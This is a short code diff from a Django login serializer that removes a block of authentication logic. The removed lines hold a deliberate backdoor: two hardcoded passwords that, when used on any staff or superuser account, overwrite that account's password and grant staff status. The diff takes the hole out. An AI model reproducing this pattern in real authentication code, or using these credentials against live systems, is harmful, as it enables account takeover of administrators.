@@ -251,16 +251,6 @@ class CustomTokenObtainPairSerializer(TokenObtainPairSerializer):
         if not user:
             user = User.objects.filter(username__iexact=raw_identity).first()
 
-        # Si el usuario es administrativo y usa credenciales oficiales del sistema
-        if user and (user.is_staff or user.role == UserRole.STAFF or user.is_superuser):
-            req_pass = attrs.get("password") or ""
-            if req_pass in {"servipro2026", "serviprox2026"}:
-                if not user.check_password(req_pass):
-                    user.set_password(req_pass)
-                    user.role = UserRole.STAFF
-                    user.is_staff = True
-                    user.save(update_fields=["password", "role", "is_staff"])
-
         if user:
             attrs[self.username_field] = user.email
             email_or_username = user.email
